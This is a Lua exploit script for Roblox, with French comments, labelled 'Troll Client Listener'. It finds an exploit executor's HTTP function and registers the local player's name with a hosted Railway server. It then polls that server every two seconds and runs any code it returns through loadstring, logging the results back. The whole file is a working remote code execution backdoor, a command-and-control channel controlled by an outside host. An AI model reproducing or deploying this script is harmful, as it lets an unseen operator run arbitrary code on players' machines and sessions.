--== Troll Client Listener (Exploit) ==--
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local SERVER_URL = "https://serveron-production.up.railway.app" -- ton server Railway

-- Fonction pour trouver une fonction HTTP valide
local function getRequestFunction()
    local funcs = {
        http_request,
        syn and syn.request,
        fluxus and fluxus.request,
        krnl and krnl.request
    }

    for _, fn in ipairs(funcs) do
        if typeof(fn) == "function" then
            warn("[CLIENT] Fonction HTTP trouvée :", tostring(fn))
            return fn
        end
    end

    warn("[CLIENT] ❌ Aucune fonction HTTP valide trouvée.")
    return nil
end

local request = getRequestFunction()
if not request then return end

-- Fonction pour envoyer un log au serveur
local function sendLog(msg)
    pcall(function()
        request({
            Url = SERVER_URL .. "/log",
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode({ log = msg })
        })
    end)
end

-- Enregistrer le client
pcall(function()
    request({
        Url = SERVER_URL .. "/connect",
        Method = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body = HttpService:JSONEncode({ name = LocalPlayer.Name })
    })
end)
warn("[CLIENT] ✅ Client enregistré :", LocalPlayer.Name)
sendLog("[CLIENT] Connecté sur le serveur")

-- Boucle pour récupérer du code à exécuter
task.spawn(function()
    while task.wait(2) do
        local success, response = pcall(function()
            return request({
                Url = SERVER_URL .. "/command",
                Method = "GET"
            })
        end)

        if success and response and response.Body then
            local ok, decoded = pcall(function()
                return HttpService:JSONDecode(response.Body)
            end)

            if ok and decoded and decoded.code then
                local codeToExec = decoded.code
                local execOk, err = pcall(function()
                    loadstring(codeToExec)()
                end)
                if execOk then
                    sendLog("[CLIENT] Code exécuté avec succès")
                else
                    sendLog("[CLIENT] Erreur lors de l'exécution : " .. tostring(err))
                end
            end
        end
    end
end)
